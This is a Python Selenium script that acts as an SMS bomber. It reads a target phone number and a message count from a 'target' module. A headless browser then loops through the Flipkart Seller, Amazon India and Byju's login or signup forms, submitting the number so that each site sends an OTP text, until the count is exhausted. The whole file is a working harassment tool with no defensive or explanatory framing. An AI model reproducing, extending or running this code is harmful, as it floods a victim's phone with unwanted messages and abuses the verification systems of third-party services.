import selenium
from selenium import webdriver
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import math
import time
from multiprocessing import Pool
import random
import target

phone = target.phone
sms_count = target.sms_count

def flipkart(driver, phone):
    try:
        driver.get("https://seller.flipkart.com/index.html#signUp/accountCreation/new")
        time.sleep(1)
        inp = driver.find_element('tag name', 'form').find_element('tag name', 'input')
        inp.send_keys(Keys.CONTROL + "a")
        inp.send_keys(Keys.DELETE)
        inp.send_keys(phone)
        time.sleep(1)
        btn = driver.find_element(By.CSS_SELECTOR, 'button.styles__ButtonStyle-sekd9q-0.ewbxDW.styles__InputCTA-sc-1vnxfs1-2.hCJtAJ')
        btn.click()
        return 1
    except:
        return 0
    
def amazon(driver, phone):
    try:
        driver.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3F%26tag%3Dgooghydrabk1-21%26ref%3Dnav_signin%26adgrpid%3D155259815513%26hvpone%3D%26hvptwo%3D%26hvadid%3D674842289437%26hvpos%3D%26hvnetw%3Dg%26hvrand%3D6284534017263284697%26hvqmt%3De%26hvdev%3Dc%26hvdvcmdl%3D%26hvlocint%3D%26hvlocphy%3D1007765%26hvtargid%3Dkwd-10573980%26hydadcr%3D14453_2316415%26gad_source%3D1&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0")
        time.sleep(1)
        inp = driver.find_element(By.CSS_SELECTOR, 'input#ap_email')
        inp.clear()
        inp.send_keys(phone)
        inp.send_keys(Keys.ENTER)
        otp_btn = driver.find_element(By.CSS_SELECTOR, 'input#continue')
        otp_btn.click()
        return 1
    except:
        return 0
    
def byjus(driver, phone):
    try:
        driver.get('https://byjus.com/')
        lgn = driver.find_element(By.CSS_SELECTOR, 'a.primary-login-btn')
        lgn.click()
        time.sleep(3)
        bframe = driver.find_element('xpath', '/html/body/div[8]/div/div/div/iframe')
        driver.switch_to.frame(bframe)
        inp = driver.find_element('xpath', '/html/body/div/div[1]/div/div/div/div/div/div[3]/div/div/div/form/div[1]/div/div/div[2]/input')
        inp.send_keys(phone)
        time.sleep(1)
        btn = driver.find_element('xpath', '/html/body/div/div[1]/div/div/div/div/div/div[3]/div/div/div/form/div[3]/button')
        btn.click()
        return 1
    except:
        try:
            btn.click()
            return 1
        except:
            return 0
        
chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--disable-notifications")
driver = webdriver.Chrome(options = chrome_options)

while sms_count > 0:
    func = random.randint(1,4)
    if func == 1:
        sms_count = sms_count - flipkart(driver, phone)
    elif func == 2:
        sms_count = sms_count - amazon(driver, phone)
    elif func == 3:
        sms_count = sms_count - byjus(driver, phone)
    time.sleep(2)
driver.close()